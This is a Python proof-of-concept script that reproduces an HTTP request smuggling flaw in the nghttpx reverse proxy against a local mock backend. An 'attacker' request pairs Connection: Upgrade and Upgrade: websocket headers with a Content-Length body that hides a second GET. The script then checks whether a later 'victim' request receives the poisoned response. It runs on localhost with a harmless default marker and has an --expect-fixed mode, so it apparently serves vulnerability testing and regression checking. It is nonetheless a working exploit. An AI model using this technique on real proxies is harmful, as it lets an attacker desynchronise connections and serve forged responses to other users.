import argparse
import json
import os
import socket
import subprocess
import sys
import threading
import time


def free_port(host):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, 0))
        return sock.getsockname()[1]


def wait_port(host, port, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.1):
                return True
        except OSError:
            time.sleep(0.05)
    return False


def read_response(sock, timeout):
    sock.settimeout(0.2)
    chunks = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = sock.recv(65536)
        except socket.timeout:
            continue
        except OSError:
            break
        if not data:
            break
        chunks.append(data)
        joined = b"".join(chunks)
        marker = joined.find(b"\r\n\r\n")
        if marker < 0:
            continue
        head = joined[: marker + 4]
        content_length = 0
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                content_length = int(line.split(b":", 1)[1].strip())
        if len(joined) >= marker + 4 + content_length:
            break
    return b"".join(chunks)


def response_body(response):
    marker = response.find(b"\r\n\r\n")
    if marker < 0:
        return b""
    return response[marker + 4 :]


def printable(data):
    return data.decode("latin1", "replace").replace("\r", "\\r").replace("\n", "\\n\n")


class UpgradeBackend:
    def __init__(self, host, delay, poison_body):
        self.host = host
        self.port = free_port(host)
        self.delay = delay
        self.poison_body = poison_body
        self.ready = threading.Event()
        self.stop = threading.Event()
        self.records = []
        self.thread = threading.Thread(target=self.run, daemon=True)

    def start(self):
        self.thread.start()
        if not self.ready.wait(5):
            raise RuntimeError("backend startup timed out")

    def close(self):
        self.stop.set()
        try:
            with socket.create_connection((self.host, self.port), timeout=0.2):
                pass
        except OSError:
            pass
        self.thread.join(timeout=2)

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((self.host, self.port))
            srv.listen(16)
            srv.settimeout(0.2)
            self.ready.set()
            while not self.stop.is_set():
                try:
                    conn, addr = srv.accept()
                except socket.timeout:
                    continue
                except OSError:
                    break
                rec = {"addr": addr, "requests": [], "events": [], "raw": bytearray()}
                self.records.append(rec)
                threading.Thread(target=self.handle, args=(conn, rec), daemon=True).start()

    def send_response(self, conn, rec, status, body):
        response = (
            f"HTTP/1.1 {status}\r\n".encode()
            + f"Content-Length: {len(body)}\r\n".encode()
            + b"Connection: keep-alive\r\n"
            + b"\r\n"
            + body
        )
        conn.sendall(response)
        rec["events"].append(f"sent:{status}:{body.decode('latin1', 'replace')}")

    def handle(self, conn, rec):
        buf = bytearray()
        with conn:
            conn.settimeout(0.2)
            deadline = time.time() + 10
            while time.time() < deadline and not self.stop.is_set():
                try:
                    data = conn.recv(65536)
                except socket.timeout:
                    data = b""
                except OSError as exc:
                    rec["events"].append(f"recv-error:{exc.__class__.__name__}")
                    return
                if data:
                    rec["raw"].extend(data)
                    buf.extend(data)
                    rec["events"].append(f"recv:{len(data)}")
                while True:
                    marker = buf.find(b"\r\n\r\n")
                    if marker < 0:
                        break
                    head = bytes(buf[: marker + 4])
                    lines = head.split(b"\r\n")
                    reqline = lines[0].decode("latin1", "replace")
                    fields = {}
                    for line in lines[1:]:
                        if b":" in line:
                            k, v = line.split(b":", 1)
                            fields[k.strip().lower()] = v.strip().lower()
                    ignore_body = b"upgrade" in fields
                    content_length = 0 if ignore_body else int(fields.get(b"content-length", b"0") or b"0")
                    total = marker + 4 + content_length
                    if len(buf) < total:
                        break
                    del buf[:total]
                    parts = reqline.split(" ")
                    path = parts[1] if len(parts) > 1 else "/"
                    rec["requests"].append(reqline)
                    if path == "/upgrade":
                        self.send_response(conn, rec, "200 OK", b"UPGRADE-REJECT")
                    elif path == "/poisoned":
                        time.sleep(self.delay)
                        self.send_response(conn, rec, "200 OK", self.poison_body)
                    elif path == "/victim":
                        self.send_response(conn, rec, "200 OK", b"VICTIM-RESPONSE")
                    else:
                        self.send_response(conn, rec, "404 Not Found", b"UNKNOWN")
                if not data:
                    continue


def launch_nghttpx(args, backend):
    port = free_port(args.host)
    cmd = [
        args.nghttpx,
        "-f",
        f"{args.host},{port};no-tls",
        "-b",
        f"{args.host},{backend.port}",
        "--workers=1",
        f"--backend-keep-alive-timeout={args.backend_keepalive}s",
        "--errorlog-file=-",
    ]
    proc = subprocess.Popen(cmd, cwd=args.cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if not wait_port(args.host, port, 5):
        proc.kill()
        proc.wait(timeout=2)
        raise RuntimeError("nghttpx frontend did not open")
    return proc, port


def run(args):
    poison_body = args.payload.encode("utf-8")
    backend = UpgradeBackend(args.host, args.delay, poison_body)
    backend.start()
    proc, frontend_port = launch_nghttpx(args, backend)
    smuggled = b"GET /poisoned HTTP/1.1\r\nHost: backend\r\n\r\n"
    attacker_payload = (
        b"GET /upgrade HTTP/1.1\r\n"
        b"Host: target\r\n"
        b"Connection: Upgrade\r\n"
        b"Upgrade: websocket\r\n"
        b"Content-Length: "
        + str(len(smuggled)).encode()
        + b"\r\n"
        b"\r\n"
        + smuggled
    )
    victim_payload = b"GET /victim HTTP/1.1\r\nHost: target\r\n\r\n"
    try:
        with socket.create_connection((args.host, frontend_port), timeout=2) as s1:
            s1.sendall(attacker_payload)
            attacker_response = read_response(s1, args.read_timeout)
        time.sleep(args.victim_wait)
        with socket.create_connection((args.host, frontend_port), timeout=2) as s2:
            s2.sendall(victim_payload)
            victim_response = read_response(s2, args.read_timeout)
        time.sleep(0.5)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=2)
        backend.close()
    stdout = proc.stdout.read() if proc.stdout else b""
    stderr = proc.stderr.read() if proc.stderr else b""
    attacker_body = response_body(attacker_response)
    victim_body = response_body(victim_response)
    result = {
        "attacker_body": attacker_body.decode("latin1", "replace"),
        "victim_body": victim_body.decode("latin1", "replace"),
        "victim_received_poison": poison_body in victim_body,
        "victim_received_expected": b"VICTIM-RESPONSE" in victim_body,
        "backend_connections": len(backend.records),
        "backend_requests": [rec["requests"] for rec in backend.records],
        "nghttpx_returncode": proc.returncode,
    }
    print(json.dumps(result, indent=2))
    if args.verbose:
        print("attacker_response:")
        print(printable(attacker_response))
        print("victim_response:")
        print(printable(victim_response))
        print("backend_trace:")
        for rec in backend.records:
            print(json.dumps({"requests": rec["requests"], "events": rec["events"]}, indent=2))
        if stdout or stderr:
            print("nghttpx_output:")
            print(printable((stdout + stderr)[-4000:]))
    if args.expect_fixed:
        return 0 if result["victim_received_expected"] and not result["victim_received_poison"] else 1
    return 0 if result["victim_received_poison"] else 1


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--nghttpx", required=True)
    parser.add_argument("--cwd", default=os.getcwd())
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--payload", default="SMUGGLED-BENIGN-PAYLOAD")
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--victim-wait", type=float, default=0.2)
    parser.add_argument("--read-timeout", type=float, default=2.0)
    parser.add_argument("--backend-keepalive", type=int, default=10)
    parser.add_argument("--expect-fixed", action="store_true")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()
    try:
        return run(args)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
